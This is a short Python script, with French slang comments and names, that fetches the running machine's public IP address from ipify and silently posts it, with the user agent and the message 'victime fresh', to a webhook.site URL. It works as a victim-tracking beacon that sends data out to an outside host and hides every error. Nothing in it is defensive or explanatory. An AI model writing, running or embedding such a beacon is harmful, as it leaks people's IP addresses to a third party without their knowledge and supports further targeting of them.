import requests

WEBHOOK = "https://webhook.site/ton_id"

def choppe_ip():
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=4)
        return r.json()["ip"]
    except:
        return "ip foireuse"

ip = choppe_ip()

data = {
    "ip": ip,
    "message": "victime fresh",
    "user_agent": requests.utils.default_user_agent()
}

try:
    requests.post(WEBHOOK, json=data, timeout=5)
except:
    pass
